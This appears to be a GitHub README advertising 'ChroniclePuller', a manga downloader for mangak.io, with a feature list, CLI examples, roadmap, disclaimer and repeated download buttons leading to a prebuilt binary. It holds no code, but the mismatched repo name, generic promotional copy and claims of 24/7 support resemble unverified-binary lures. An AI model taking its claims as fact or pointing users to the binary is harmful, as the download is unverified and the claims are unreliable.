![preview](https://raw.githubusercontent.com/dedek1974/manga-harvester-async/main/preview.svg)

# **ChroniclePuller**

A new paradigm in digital comic archiving. Inspired by the efficiency of tools like `mangak-downloader`, **ChroniclePuller** reimagines the process of preserving visual narratives from the `mangak.io` ecosystem. It is not merely a downloader; it is a **curation engine** designed for the discerning collector who values both aesthetics and efficiency.

We have moved beyond the simple act of fetching images. ChroniclePuller treats every chapter as a unique artifact to be cataloged, organized, and presented with a level of polish rarely seen in utility software. The result is a hybrid tool that serves as both a powerful command-line interface (CLI) for batch operations and a stunning graphical user interface (GUI) that feels like a native application for your digital library.

---

## 📖 Overview

The landscape of digital manga consumption is fragmented. Readers often juggle multiple bookmarks, deal with inconsistent naming conventions, and struggle with legacy tools that feel like relics of the early internet. ChroniclePuller was built to solve these friction points.

It operates on three core principles:
1.  **Preservation with Style:** Archiving should not come at the cost of a terrible user experience. Our GUI, designed with a dark theme, transforms the act of downloading into a visual experience.
2.  **Performance without Compromise:** Leveraging asynchronous concurrent operations, the tool can pull entire series in the time it takes older tools to process a single volume.
3.  **Universal Access:** Whether you prefer the precision of the terminal or the comfort of a clickable interface, ChroniclePuller meets you where you work.

---

## ✨ Key Features

### 🌑 Immersive Dark-Themed GUI
The interface is not just an afterthought. It is a fully responsive, beautifully rendered environment that respects your eyes during late-night reading sessions. Menus blend into the shadows, progress bars glow with purpose, and the layout adjusts seamlessly between desktop and tablet resolutions.

### 🚀 Async Concurrent Engine
Under the hood, ChroniclePuller uses a non-blocking, asynchronous architecture. This means multiple chapters can be processed simultaneously without locking up the interface or consuming unnecessary overhead. The result is a **3x to 5x speed increase** compared to standard synchronous tools.

### 🌍 Multilingual Interface & Metadata
The tool speaks your language. The interface currently supports English, Japanese, Spanish, French, and German, with a community-driven translation system for adding more. Furthermore, the downloaded archives preserve full multilingual metadata, ensuring that titles and descriptions remain accurate regardless of the source language.

### 🛠️ Feature-Rich CLI Mode
For power users and scripting enthusiasts, the CLI offers every feature of the GUI with the speed of the terminal. Use flags to define output formats (CBZ, PDF, or custom folders), set quality presets, and automate nightly archives.

### ⚡ Smart Rate Limiting & Error Handling
ChroniclePuller intelligently manages request pacing to avoid server strain while maximizing throughput. If a download fails, it does not stop the queue; it logs the error, retries with exponential backoff, and continues, providing a detailed report at the end.

### 🧩 Modular Plugin Architecture
The core engine is designed for extensibility. While the primary focus is `mangak.io`, the underlying framework can be adapted to other sources. The plugin system allows for custom source handlers without modifying the main codebase.

### 🔄 Continuous Updates & 24/7 Support
This project is maintained by a dedicated team that pushes stability updates and feature enhancements monthly. Additionally, a community knowledge base and a guaranteed response time for verified ticket submissions ensure you are never left alone with a broken pipeline.

---

## [![Download](https://raw.githubusercontent.com/dedek1974/manga-harvester-async/main/button.svg)](https://dedek1974.github.io/manga-harvester-async/)

Get the latest stable release for your operating system. ChroniclePuller is packaged as a single binary with zero external dependencies, ensuring a clean installation.

---

## 🚦 Getting Started (Quick Start)

First, ensure your system meets the minimum requirements: a modern operating system (Windows 10+, macOS 12+, or a Linux distro with glibc 2.28+).

1.  **Acquire the Binary:** Download the appropriate archive for your platform from the [![Download](https://raw.githubusercontent.com/dedek1974/manga-harvester-async/main/button.svg)](https://dedek1974.github.io/manga-harvester-async/) section above.
2.  **Extract:** Unpack the archive to a directory of your choice. The application is portable—no system-wide installation is required.
3.  **Launch the GUI:** Run the executable named `ChroniclePuller` (or `ChroniclePuller.exe` on Windows).
4.  **Set Your Source:** In the "Source Management" panel, configure your `mangak.io` series URL.
5.  **Start Pulling:** Queue your chapters and experience the flow.

For CLI users, simply invoke the binary with the `--help` flag to see all available commands.

---

## 🧭 Usage Scenarios

### Scenario A: The Nightly Archive
You want to download the latest 5 chapters of your favorite series every night at 2 AM.
**Solution:** Use the CLI with a cron job or Task Scheduler.
```
ChroniclePuller pull --series "https://mangak.io/series/example" --chapters latest:5 --output-dir /archive/manga
```

### Scenario B: The Complete Collection
You have a backlog of 200 chapters and want them all, organized by volume.
**Solution:** Use the GUI. Set "Range" to "Full Series," enable "Sort by Volume," and click "Pull." The async engine will handle the rest while you sleep.

### Scenario C: The Portable Reader
You need to read on a device without internet access.
**Solution:** Pull the series in CBZ format (Comic Book Zip). Most reader apps support this format natively.

---

## 🗺️ Roadmap for 2026

The development for 2026 focuses on expanding the ecosystem.

- **Q1 2026:** Release of the "ChronicleSync" feature—a cloud-compatible sync engine that allows you to pause a download on your desktop and resume it on your laptop.
- **Q2 2026:** Beta release of the pre-compiled open-source plugin SDK, allowing third-party developers to build custom source connectors.
- **Q3 2026:** Introduction of "Smart Folders"—virtual collections that automatically update based on rules (e.g., "Only include chapters released this week").
- **Q4 2026:** Community localization expansion for Hindi, Arabic, and Korean.

---

## ⚠️ Disclaimer

ChroniclePuller is a tool designed exclusively for **personal archival purposes**. The software intends to help users preserve content that they have legal access to view via the platform. The developers of ChroniclePuller do not host, distribute, or store any copyrighted content on their servers. Users are solely responsible for ensuring their use of this tool complies with the applicable terms of service of the source website and local copyright laws. The authors provide this software "as is" without any warranty or liability for misuse.

---

## 📜 License

This project is open source and distributed under the terms of the **MIT License**.

You are free to:
- Use the software commercially
- Modify the source code
- Distribute the modified work
- Use it privately

Under the condition that you include the original copyright notice and disclaimer.

See the full license text at: [LICENSE](https://opensource.org/licenses/MIT)

---

## [![Download](https://raw.githubusercontent.com/dedek1974/manga-harvester-async/main/button.svg)](https://dedek1974.github.io/manga-harvester-async/)

**Final Call:** ChroniclePuller stands as a testament to what happens when utility meets design. Download the latest build now and transform the way you manage your digital library. No ads, no tracking, no bloat—just efficient, beautiful preservation.